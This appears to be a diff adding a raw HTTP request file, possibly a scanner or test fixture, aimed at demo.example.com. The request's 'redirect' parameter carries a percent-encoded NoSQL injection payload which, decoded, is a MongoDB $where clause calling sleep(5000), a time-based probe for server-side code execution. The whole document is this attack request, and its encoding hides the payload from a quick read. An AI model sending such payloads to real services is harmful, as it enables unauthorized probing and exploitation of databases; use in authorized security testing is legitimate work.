@@ -1,0 +1,4 @@
+GET /a?redirect=%7B%22%24%77%68%65%72%65%22%3A%22%73%6C%65%65%70%28%35%30%30%30%29%20%7C%7C%20%74%72%75%65%22%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
